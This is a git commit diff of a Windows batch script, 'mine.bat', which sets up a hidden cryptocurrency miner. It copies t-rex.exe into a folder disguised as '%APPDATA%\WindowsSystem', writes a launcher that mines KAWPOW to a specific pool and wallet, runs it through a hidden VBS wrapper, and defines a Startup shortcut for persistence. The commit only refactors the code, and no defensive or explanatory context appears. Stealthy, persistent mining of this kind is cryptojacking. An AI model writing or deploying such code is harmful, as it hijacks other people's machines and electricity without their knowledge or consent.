70624acb595026649697dd54e5124c95edd06d53
Tejasvi Sharma <134033214+iemtejasvi@users.noreply.github.com>
2025-02-18 12:24:12 +0530

    mine.bat

--- mine.bat
+++ mine.bat
@@ -1,29 +1,26 @@
 @echo off
 setlocal
 
-:: Define paths
+:: Define script and miner paths
 set "MINER_DIR=%APPDATA%\WindowsSystem"
 set "MINER_SCRIPT=%MINER_DIR%\miner.bat"
 set "VBS_SCRIPT=%MINER_DIR%\run_hidden.vbs"
-set "MINER_EXEC=%MINER_DIR%\t-rex.exe"
 set "STARTUP_SHORTCUT=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\miner.lnk"
+set "T_REX_EXEC=%MINER_DIR%\t-rex.exe"
 
 :: Create necessary directories
 mkdir "%MINER_DIR%" 2>nul
 
 :: Ensure t-rex.exe exists
-if not exist "%MINER_EXEC%" (
+if not exist "%T_REX_EXEC%" (
     echo ERROR: t-rex.exe not found in "%MINER_DIR%"! > "%MINER_DIR%\miner_error.log"
     exit /b
 )
 
-:: Write miner script (ensuring absolute path and correct execution)
+:: Write miner script
 (
     echo @echo off
-    echo cd /d "%MINER_DIR%"
-    echo :loop
-    echo ping -n 1 1.1.1.1 ^>nul || (timeout /t 5 >nul & goto loop)
-    echo start /b "" "%MINER_EXEC%" -a KAWPOW -o stratum+tcp://in.mining4people.com:4184 -u FGCUYXfyB5eE1M5Fb3vbq9RLHpq1tZ1ss1.HeHe
+    echo cd /d "%MINER_DIR%"  ^&^& start /b "" "%T_REX_EXEC%" -a KAWPOW -o stratum+tcp://in.mining4people.com:4184 -u FGCUYXfyB5eE1M5Fb3vbq9RLHpq1tZ1ss1.HeHe
 ) > "%MINER_SCRIPT%"
 
 :: Write VBS script to run miner in hidden mode
